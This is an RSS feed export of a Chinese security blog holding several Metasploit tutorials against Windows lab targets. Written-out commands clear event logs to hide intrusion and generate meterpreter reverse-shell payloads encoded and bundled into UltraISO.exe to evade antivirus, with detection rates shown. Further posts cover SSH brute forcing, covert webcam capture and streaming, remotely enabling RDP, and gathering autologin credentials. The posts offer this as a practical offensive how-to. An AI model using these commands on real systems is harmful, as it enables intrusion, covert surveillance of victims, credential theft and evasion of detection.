<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title></title>
        <subtitle>翩若浮云着霓裳，落幕鬓边皆染霜</subtitle>
        <icon>https://mangpumo.github.io/images/favicon.ico</icon>
        <link>https://MangPumo.github.io</link>
        <author>
          <name>Mang Pumo</name>
        </author>
        <description>欢迎来到 Mang Pumo 的个人博客!</description>
        <language>zh-CN</language>
        <pubDate>Thu, 12 Jan 2023 22:18:52 +0800</pubDate>
        <lastBuildDate>Thu, 12 Jan 2023 22:18:52 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/</guid>
            <title>msf清理事件日志</title>
            <link>https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/</link>
            <pubDate>Thu, 12 Jan 2023 22:18:52 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;再进入肉鸡执行一些操作时，windows 下记录的操作日志可在日志查看器中进行查看，可以通过运行 eventvwr 命令打开。包括了应用程序、系统、安全等模块的日志，为了不让其查到自己或知道自己的操作，则可以使用 meterpreter 的 clearev 命令来清除其日志。未清除日志前可查看系统记录的一些处理信息。&lt;/p&gt;
&lt;p&gt;![1645511582659](03 msf 清理事件日志.assets/1645511582659.png)&lt;/p&gt;
&lt;p&gt;然后在 meterpreter 下执行 clearev 命令，可以看到清除提示，分别清除了应用程序，系统和安全模块的日志记录。&lt;/p&gt;
&lt;p&gt;clearev      清理日志&lt;/p&gt;
&lt;p&gt;![1645511593151](03 msf 清理事件日志.assets/1645511593151.png)&lt;/p&gt;
&lt;p&gt;（注意 使用 clearev 命令时 需要获得靶机的 system  权限）&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/</guid>
            <title>msf免杀编码</title>
            <link>https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/</link>
            <pubDate>Thu, 12 Jan 2023 22:18:18 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;杀软是如何检测出恶意代码的？&lt;br&gt;
特征码、启发式恶意软件检查和行为。&lt;br&gt;
免杀是做什么？&lt;br&gt;
对特征进行混淆，打乱代码，避免杀毒软件查杀&lt;br&gt;
免杀的基本方法有哪些？&lt;br&gt;
自编码处理  自捆绑 + 编码  多重编码   接口下载式  签名伪装式&lt;/p&gt;
&lt;p&gt;针对杀毒软件的基本检测方法，我们可有以下几种方法实现免杀：&lt;/p&gt;
&lt;p&gt;改变特征码&lt;br&gt;
改变行为&lt;br&gt;
其它&lt;/p&gt;
&lt;p&gt;由于 msf 被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果&lt;/p&gt;
&lt;p&gt;要用到的在线查毒工具 virscan 提供&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlyc2Nhbi5vcmcv&#34;&gt;https://www.virscan.org/&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;一-不处理payload直接生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-不处理payload直接生成样本进行检测&#34;&gt;#&lt;/a&gt; 一、不处理 payload 直接生成样本进行检测&lt;/h1&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.32 LPORT=4456 -f exe -o payload1.exe&lt;/p&gt;
&lt;p&gt;![1645511560404](02 msf 编码免杀.assets/1645511560404.png)&lt;/p&gt;
&lt;p&gt;进行查毒有 41% 的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;具体查毒链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yLnZpcnNjYW4ub3JnL2xhbmd1YWdlL2VuL3JlcG9ydC8yN2VhNTNiYWI0NGUwYTAyM2I1N2MyNzk5MWYwMmNmOQ==&#34;&gt;https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;![1645511550808](02 msf 编码免杀.assets/1645511550808.png)&lt;/p&gt;
&lt;h1 id=&#34;二-msf自编码处理payload生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-msf自编码处理payload生成样本进行检测&#34;&gt;#&lt;/a&gt; 二、 MSF 自编码处理 payload 生成样本进行检测&lt;/h1&gt;
&lt;p&gt;首先我们输入   msfvenom --list encoders   查看可以用编码模块&lt;/p&gt;
&lt;p&gt;![1645511543145](02 msf 编码免杀.assets/1645511543145.png)&lt;/p&gt;
&lt;p&gt;我们使用  x86/shikata_ga_nai 模块 免杀中使用频率最高的一个编码器&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai HOST=192.168.110.110  LPORT=4456 -f exe -o payload1.exe&lt;/p&gt;
&lt;p&gt;进行查毒有 37% 的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;![1645511533351](02 msf 编码免杀.assets/1645511533351.png)&lt;/p&gt;
&lt;h1 id=&#34;三-msf自捆绑处理payload生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-msf自捆绑处理payload生成样本进行检测&#34;&gt;#&lt;/a&gt; 三、MSF 自捆绑处理 payload 生成样本进行检测&lt;/h1&gt;
&lt;p&gt;使用 msfvenom 的 - x 参数可以指定一个可执行文件，将 payload 与其捆绑&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -x UltraISO.exe -f exe -o payload2.exe&lt;/p&gt;
&lt;p&gt;![1645511525813](02 msf 编码免杀.assets/1645511525813.png)&lt;/p&gt;
&lt;p&gt;进行查毒有 37% 的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;![1645511516751](02 msf 编码免杀.assets/1645511516751.png)&lt;/p&gt;
&lt;h1 id=&#34;四-msf自捆绑编码处理payload生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-msf自捆绑编码处理payload生成样本进行检测&#34;&gt;#&lt;/a&gt; 四、MSF 自捆绑 + 编码处理 payload 生成样本进行检测&lt;/h1&gt;
&lt;p&gt;结合第二种，第三种。编码方式我们再次生成样本&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 10 -f exe -o payload3.exe&lt;/p&gt;
&lt;p&gt;![1645511507586](02 msf 编码免杀.assets/1645511507586.png)&lt;/p&gt;
&lt;p&gt;进行查毒有 31% 的杀毒软件报毒了&lt;/p&gt;
&lt;p&gt;![1645511497457](02 msf 编码免杀.assets/1645511497457.png)&lt;/p&gt;
&lt;p&gt;那我们继续增加编码次数&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 20 -f exe -o payload4.exe&lt;/p&gt;
&lt;p&gt;进行查毒有 27% 的杀毒软件报毒了！&lt;/p&gt;
&lt;p&gt;![1645511487704](02 msf 编码免杀.assets/1645511487704.png)&lt;/p&gt;
&lt;h1 id=&#34;五-msf多重编码payload生成样本进行检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#五-msf多重编码payload生成样本进行检测&#34;&gt;#&lt;/a&gt; 五、MSF 多重编码 payload 生成样本进行检测&lt;/h1&gt;
&lt;p&gt;通过管道，让 msfvenom 用不同编码器反复编码进行混淆。使用管道让 msfvenom 对攻击载荷多重编码，先用 shikata_ga_nai 编码 10 次，接着来 10 次的 alpha_upper 编码，再来 10 次的 countdown 编码，最后才生成以 payload5.exe 为模板的可执行文件。&lt;/p&gt;
&lt;p&gt;msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=192.168.110.110 LPORT=4456 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x UltraISO.exe -f exe -o payload5.exe&lt;/p&gt;
&lt;h1 id=&#34;六-生成shellcode使用c语言调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#六-生成shellcode使用c语言调用&#34;&gt;#&lt;/a&gt; 六、 生成 Shellcode 使用 C 语言调用&lt;/h1&gt;
&lt;p&gt;1、直接在 linux 中利用 msf 的 meterpreter 生成的文件以.c 形式文件存储，得到机器码。命令：&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -f c &amp;gt;c0001.c&lt;/p&gt;
&lt;p&gt;![1645511458128](02 msf 编码免杀.assets/1645511458128.png)&lt;/p&gt;
&lt;p&gt;2、改 c 文件，并编译，并加壳&lt;/p&gt;
&lt;p&gt;![1645511469800](02 msf 编码免杀.assets/1645511469800.png)&lt;/p&gt;
&lt;p&gt;随便写一个 hello world&lt;/p&gt;
&lt;p&gt;main() {&lt;br&gt;
printf(&amp;quot;hello world\n&amp;quot;);&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;然后编译 并加壳&lt;/p&gt;
&lt;p&gt;vmp 加壳工具&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/</guid>
            <title>msf辅助模块</title>
            <link>https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/</link>
            <pubDate>Thu, 12 Jan 2023 22:10:07 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;说明：我们知道 msf 辅助模块有上千个，主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ 测试发掘漏洞、实施网络协议欺骗等&lt;/p&gt;
&lt;h1 id=&#34;一-怎么查询-auxiliary辅助模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-怎么查询-auxiliary辅助模块&#34;&gt;#&lt;/a&gt; 一、怎么查询 Auxiliary 辅助模块&lt;/h1&gt;
&lt;p&gt;我们可以通过以下命令查询所有 Auxiliary 辅助模块&lt;/p&gt;
&lt;p&gt;use auxiliary/ 或   show auxiliary&lt;/p&gt;
&lt;h1 id=&#34;二-auxiliary辅助模块分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-auxiliary辅助模块分类&#34;&gt;#&lt;/a&gt; 二、 Auxiliary 辅助模块分类&lt;/h1&gt;
&lt;hr&gt;
&lt;h4 id=&#34;admin&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#admin&#34;&gt;#&lt;/a&gt; admin&lt;/h4&gt;
&lt;hr&gt;
&lt;p&gt;/admin/android&lt;/p&gt;
&lt;p&gt;/admin/http&lt;/p&gt;
&lt;p&gt;/admin/mysql/&lt;/p&gt;
&lt;p&gt;/admin/oracle/&lt;/p&gt;
&lt;p&gt;/admin/vmware/&lt;/p&gt;
&lt;p&gt;/admin/smb/&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;dos&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dos&#34;&gt;#&lt;/a&gt; dos&lt;/h4&gt;
&lt;hr&gt;
&lt;p&gt;/dos/android/&lt;/p&gt;
&lt;p&gt;/dos/http/&lt;/p&gt;
&lt;p&gt;/dos/cisco/&lt;/p&gt;
&lt;p&gt;/dos/dns/&lt;/p&gt;
&lt;p&gt;/dos/smb/&lt;/p&gt;
&lt;p&gt;/dos/windows/ftp/&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;fuzzers&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuzzers&#34;&gt;#&lt;/a&gt; fuzzers&lt;/h4&gt;
&lt;hr&gt;
&lt;p&gt;/fuzzers/http/&lt;/p&gt;
&lt;p&gt;/fuzzers/smb/&lt;/p&gt;
&lt;p&gt;/gather/&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;scanner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scanner&#34;&gt;#&lt;/a&gt; scanner&lt;/h4&gt;
&lt;hr&gt;
&lt;p&gt;/scanner/portscan/&lt;/p&gt;
&lt;p&gt;/scanner/ftp/&lt;/p&gt;
&lt;p&gt;/scanner/http/&lt;/p&gt;
&lt;p&gt;/scanner/ssh/&lt;/p&gt;
&lt;p&gt;/scanner/smb/&lt;/p&gt;
&lt;p&gt;/scanner/vmware/&lt;/p&gt;
&lt;p&gt;/scanner/vnc/&lt;/p&gt;
&lt;p&gt;/scanner/telnet/&lt;/p&gt;
&lt;p&gt;/scanner/msyql/&lt;/p&gt;
&lt;p&gt;/scanner/ntp/&lt;/p&gt;
&lt;p&gt;/scanner/openvas/&lt;/p&gt;
&lt;p&gt;/scanner/sap/&lt;/p&gt;
&lt;h4 id=&#34;server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#server&#34;&gt;#&lt;/a&gt; server&lt;/h4&gt;
&lt;p&gt;/server/&lt;/p&gt;
&lt;h1 id=&#34;三-通过分类查询指定模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-通过分类查询指定模块&#34;&gt;#&lt;/a&gt; 三、通过分类查询指定模块&lt;/h1&gt;
&lt;p&gt;通过 search 查询指定模块&lt;/p&gt;
&lt;p&gt;search type:auxiliary name:smb&lt;/p&gt;
&lt;p&gt;type： 后门跟的的模块类型   name ： 后门跟的就是要搜的模块名&lt;/p&gt;
&lt;h1 id=&#34;四-怎么调用模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-怎么调用模块&#34;&gt;#&lt;/a&gt; 四、怎么调用模块&lt;/h1&gt;
&lt;p&gt;我们调一个 smb 模块演示&lt;/p&gt;
&lt;p&gt;1 查询与 SMB	相关的辅助模块&lt;/p&gt;
&lt;p&gt;search type:auxiliary name:smb&lt;/p&gt;
&lt;p&gt;2 加载一个 ms17_010 探测模块&lt;/p&gt;
&lt;p&gt;use auxiliary/scanner/smb/smb_ms17_010&lt;/p&gt;
&lt;p&gt;3 查看载入模块需要配置的参数&lt;/p&gt;
&lt;p&gt;show options&lt;/p&gt;
&lt;p&gt;![1645511393570](01 msf 辅助模块.assets/1645511393570.png)&lt;/p&gt;
&lt;p&gt;set RHOSTS 192.168.110.110   (设定目标 IP)&lt;/p&gt;
&lt;p&gt;set THREADS 10    （如果觉得探测过慢可以增加线程，根据电脑实际性能来不要配置太多 个人建议最大 10）&lt;/p&gt;
&lt;p&gt;run （执行探测）&lt;/p&gt;
&lt;p&gt;![1645511404119](01 msf 辅助模块.assets/1645511404119.png)&lt;/p&gt;
&lt;p&gt;![1645511415106](01 msf 辅助模块.assets/1645511415106.png)&lt;/p&gt;
&lt;h1 id=&#34;五-更多&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#五-更多&#34;&gt;#&lt;/a&gt; 五、更多&lt;/h1&gt;
&lt;p&gt;1 whois 查看域名或 IP 信息  （hu yi zi）&lt;/p&gt;
&lt;p&gt;whois &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iYWlkdS5jb20=&#34;&gt;www.baidu.com&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;whois 192.168.0.1&lt;/p&gt;
&lt;p&gt;2  利用辅助模块查找邮箱&lt;/p&gt;
&lt;p&gt;use auxiliary/gather/search_email_collector&lt;/p&gt;
&lt;p&gt;3 DNS 枚举，使用 auxiliary 模块下的 DNS 枚举模块：&lt;/p&gt;
&lt;p&gt;use auxiliary/gather/enum_dns&lt;/p&gt;
&lt;p&gt;4 ssh 爆破，使用 auxiliary 模块下的 ssh_login&lt;/p&gt;
&lt;p&gt;use /auxiliary/scanner/ssh/ssh_login&lt;/p&gt;
&lt;p&gt;set RHOSTS 192.168.1.92   (设定目标 IP)&lt;br&gt;
 set USERNAME root    （设定 ssh 登陆账户）&lt;br&gt;
set PASS_FILE /kevin/ssh_passwd.txt   （设定暴力字典）&lt;br&gt;
set THREADS 100           (线程设置为 100)&lt;br&gt;
 show options                   (查看更改后的参数) 12345&lt;/p&gt;
&lt;p&gt;run   开始爆破&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/</guid>
            <title>后渗透之调摄像头</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/</link>
            <pubDate>Thu, 12 Jan 2023 21:41:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台 windiows 靶机&lt;/p&gt;
&lt;p&gt;3 一台安卓设备，没有可以使用模拟器&lt;/p&gt;
&lt;h1 id=&#34;二-实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实战&#34;&gt;#&lt;/a&gt; 二、实战&lt;/h1&gt;
&lt;p&gt;靶机获取到 meterpreter 后我们可以使用  webcam 模块实现调用软，硬件摄像头&lt;/p&gt;
&lt;p&gt;webcam 模块支持命令&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;模块名&lt;/th&gt;
&lt;th&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;webcam_list&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;列出靶机中的所有软，硬件摄像头列表，并编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;webcam_snap&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;可调用单个软，硬件摄像头拍照，默认调用第一个摄像头&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;webcam_stream&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;可调用单个软，硬件摄像头直播，默认调用第一个摄像头&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;1  webcam_list&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494100592.png&#34; alt=&#34;1644494100592&#34;&gt;&lt;/p&gt;
&lt;p&gt;2 webcam_snap  调用单个软，硬件摄像头拍照&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-h&lt;/td&gt;
&lt;td&gt;显示帮助&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;-i 1 “1” 代表调用摄像头编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;-p&lt;/td&gt;
&lt;td&gt;-p  /root &amp;quot;root&amp;quot; 设置存储路径&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;-q&lt;/td&gt;
&lt;td&gt;-q  100  &amp;quot;100&amp;quot; 表示存储图片的质量默认为 50&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;-v  false   -v 2 个参数  true 和  false   这个参数表示拍照后自动打开，默认参数为 true&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;img data-src=&#34;%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494089950.png&#34; alt=&#34;1644494089950&#34;&gt;&lt;/p&gt;
&lt;p&gt;3 webcam_stream  调用单个软，硬件摄像头直播&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-h&lt;/td&gt;
&lt;td&gt;显示帮助&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-d&lt;/td&gt;
&lt;td&gt;-d 100  &amp;quot;100&amp;quot;=100 秒   设置流持续时间为 100 秒   默认为 1800&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;-i 1 “1” 代表调用摄像头编号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;-q&lt;/td&gt;
&lt;td&gt;-q 100 “100” 指流质量 默认为 50&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;-s&lt;/td&gt;
&lt;td&gt;-s live “live” 指流文件路径  默认输出在当前目录（注意目录不存在不会自动创建）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;-f&lt;/td&gt;
&lt;td&gt;-f live “live” 指播放文件的存储地址  默认输出在当前目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;-v  false   -v 2 个参数  true 和  false   这个参数表示拍照后自动打开，默认参数为 true&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/</guid>
            <title>后渗透之远程监控Windows</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/</link>
            <pubDate>Thu, 12 Jan 2023 21:33:52 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;h4 id=&#34;1-rdesktop&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-rdesktop&#34;&gt;#&lt;/a&gt; 1 rdesktop&lt;/h4&gt;
&lt;p&gt;在线安装  rdesktop&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Debian,Ubuntu,kali 下使用以下命令&lt;/p&gt;
&lt;p&gt;apt-get install rdesktop&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Centos/RedHat 可以通过 yum 命令&lt;/p&gt;
&lt;p&gt;yum -y install rdesktop&lt;/p&gt;
&lt;h4 id=&#34;2-一台windiows靶机没有物理电脑可以使用虚拟机代替&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-一台windiows靶机没有物理电脑可以使用虚拟机代替&#34;&gt;#&lt;/a&gt; 2 一台 windiows 靶机（没有物理电脑可以使用虚拟机代替）&lt;/h4&gt;
&lt;h4 id=&#34;3-msf-metasploit-framework&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-msf-metasploit-framework&#34;&gt;#&lt;/a&gt; 3 MSF-Metasploit Framework&lt;/h4&gt;
&lt;h1 id=&#34;二-实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实战&#34;&gt;#&lt;/a&gt; 二、实战&lt;/h1&gt;
&lt;p&gt;1 使用 rdesktop 远程控制&lt;/p&gt;
&lt;p&gt;说明：rdesktop 是 linux 下支持 Windows 远程桌面连接的客户端程序，在 linux 系统下可通过它远程访问 Windows 桌面，支持多种版本。rdesktop 是 sourceforge 下支持 GPL 协议的一个开源项目，采用 RDP（Remote Desktop Protocol, 远程桌面协议），几乎可以连接 windows 的所有版本&lt;/p&gt;
&lt;p&gt;rdesktop 常用参数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-u&lt;/td&gt;
&lt;td&gt;账户名&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-p&lt;/td&gt;
&lt;td&gt;密码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;-a 16&lt;/td&gt;
&lt;td&gt;指使用 16 位色显示远程画面&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;-f&lt;/td&gt;
&lt;td&gt;全屏模式（用&lt;strong&gt; Ctrl+Alt+Enter&lt;/strong&gt; 组合键退出全屏）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;-g&lt;/td&gt;
&lt;td&gt;设置分辨率 如 :   -g 1024x768&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;rdesktop -h&lt;/td&gt;
&lt;td&gt;查看 rdesktop 使用帮助&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;rdesktop -u 用户名 -p  密码  -f   IP&lt;/p&gt;
&lt;p&gt;rdesktop -u mb -p 123456 -f  -g 1024x720 192.168.110.24&lt;/p&gt;
&lt;p&gt;如果远程计算机没有启动远程功能我们可以在 meterpreter 中输入&lt;/p&gt;
&lt;p&gt;启动远程桌面协议：run post/windows/manage/enable_rdp&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;2 通过 vnc 远程&lt;/p&gt;
&lt;p&gt;![1644493726723](26 后渗透远程控制.assets/1644493726723.png)&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/</guid>
            <title>后渗透之获取登陆账号密码Windows</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/</link>
            <pubDate>Thu, 12 Jan 2023 21:29:57 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台 windiows 靶机&lt;/p&gt;
&lt;h1 id=&#34;二-实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实战&#34;&gt;#&lt;/a&gt; 二、实战&lt;/h1&gt;
&lt;p&gt;首先获得一个有 SYSTEM 权限的 meterpreter&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493974746.png&#34; alt=&#34;1644493974746&#34;&gt;&lt;/p&gt;
&lt;p&gt;1 抓取自动登录账户密码&lt;/p&gt;
&lt;p&gt;2 导出 SAM 数据库本地账户密码文件&lt;/p&gt;
&lt;p&gt;3 导出密码哈希&lt;/p&gt;
&lt;p&gt;4 使用 kiwi 模块获取&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;1  很多人喜欢给在计算机设置自动登录 我们可以通过抓取自动登录的账户密码&lt;/p&gt;
&lt;p&gt;run windows/gather/credentials/windows_autologin&lt;/p&gt;
